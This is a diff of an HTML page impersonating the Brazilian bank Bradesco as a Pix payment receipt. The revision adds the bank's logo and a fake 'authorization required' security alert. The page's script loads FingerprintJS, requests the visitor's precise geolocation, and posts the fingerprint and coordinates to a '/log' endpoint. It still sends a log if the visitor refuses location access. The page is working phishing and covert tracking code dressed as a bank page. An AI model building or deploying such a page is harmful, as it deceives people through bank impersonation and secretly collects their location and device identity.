@@ -1,43 +1,94 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Bradesco - Comprovante Pix</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
   <style>
-    body { background: #f2f2f2; text-align: center; font-family: Arial; margin: 0; padding: 0; }
-    img { width: 90%; max-width: 500px; margin-top: 30px; display: none; }
-    button {
-      padding: 12px 25px;
-      font-size: 16px;
-      background-color: #e53935;
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #c00404, #a60061);
+      font-family: 'Roboto', sans-serif;
+      color: #2e2e2e;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .logo {
+      width: 120px;
+      margin-bottom: 30px;
+    }
+
+    .alert-box {
+      background-color: #fff3cd;
+      border-left: 6px solid #ffc107;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+
+    .alert-box h2 {
+      color: #b00000;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+
+    .alert-icon {
+      font-size: 26px;
+      margin-bottom: 8px;
+    }
+
+    .pix-btn {
+      margin-top: 20px;
+      padding: 14px 28px;
+      background-color: #b00000;
       color: white;
       border: none;
-      border-radius: 4px;
+      border-radius: 50px;
+      font-size: 16px;
+      font-weight: bold;
       cursor: pointer;
-      margin-top: 20px;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.15);
     }
-    button:hover {
-      background-color: #c62828;
+
+    .pix-btn:hover {
+      background-color: #900000;
     }
-    #securityWarning {
-      background: #fff3cd;
-      border: 1px solid #ffeeba;
-      border-radius: 5px;
-      padding: 20px;
-      margin: 40px auto 10px;
-      max-width: 600px;
+
+    #pixImage {
+      margin-top: 25px;
+      width: 100%;
+      max-width: 400px;
+      display: none;
+      border-radius: 8px;
     }
   </style>
 </head>
 <body>
-  <div id="securityWarning">
-    <h2 style="color: red;">⚠️ Bradesco precisa da sua autorização</h2>
-    <p>Por segurança, é necessário validar sua localização para liberar o comprovante Pix.</p>
-    <p>Clique no botão abaixo e permita o acesso à localização quando solicitado.</p>
-    <button onclick="getLocation()">✅ Autorizar e Visualizar Pix</button>
-  </div>
+  <div class="container">
+    <img src="bradesco-com-degrade-logo-D276931A0A-seeklogo.com-removebg-preview.png" alt="Logo Bradesco" class="logo" />
 
-  <img id="pixImage" src="comprovante.jpg" alt="Comprovante Pix">
+    <div class="alert-box" id="securityWarning">
+      <div class="alert-icon">⚠️</div>
+      <h2>Autorização Necessária</h2>
+      <p>Por motivos de segurança, o sistema Bradesco precisa da sua autorização para exibir o comprovante do Pix enviado.</p>
+      <p>Isso garante a integridade da transação e protege você contra acessos não autorizados.</p>
+      <button class="pix-btn" onclick="getLocation()">Autorizar e Visualizar Pix</button>
+    </div>
+
+    <img id="pixImage" src="comprovante.jpg" alt="Comprovante Pix">
+  </div>
 
   <!-- FingerprintJS -->
   <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
@@ -61,7 +112,6 @@
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
 
-                    // Envia os dados com localização
                     fetch("/log", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
@@ -74,12 +124,10 @@
                       })
                     });
 
-                    // Mostra o Pix e esconde o alerta
                     document.getElementById("pixImage").style.display = "block";
                     document.getElementById("securityWarning").style.display = "none";
                   },
                   err => {
-                    // Mesmo que negue, envia log sem localização
                     fetch("/log", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
@@ -91,8 +139,7 @@
                         loc: null
                       })
                     });
-
-                    alert("❌ Não foi possível validar a localização. Recarregue e tente novamente.");
+                    alert("❌ Não foi possível validar a autorização. Tente novamente.");
                   },
                   { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
